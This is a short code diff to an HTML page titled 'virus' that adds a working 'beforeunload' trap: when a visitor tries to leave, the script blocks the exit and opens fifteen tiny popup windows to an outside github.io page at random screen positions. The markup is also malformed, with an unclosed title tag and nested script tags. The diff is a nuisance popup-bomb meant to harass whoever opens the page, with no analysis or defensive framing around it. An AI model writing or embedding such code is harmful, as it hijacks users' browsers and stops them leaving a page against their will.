@@ -4,8 +4,11 @@
 <title>virus<title>
 </head>
 <script>
-        window.addEventListener('beforeunload'{
-            var times = 15
+      <script type="text/javascript">
+        window.addEventListener('beforeunload', function (e) {
+            e.preventDefault();
+            e.returnValue = '';
+             var times = 15
    for(var i = 0; i < times; i++){
    var popup = window.open("https://ratatosk231.github.io/i/", "", "width = 10, height = 10");
    var x = Math.floor((Math.random() * 2000) + 1);
@@ -13,5 +16,6 @@
    popup.moveTo(x, y);
    }
         });
+        </script>
 </script>
 </html>
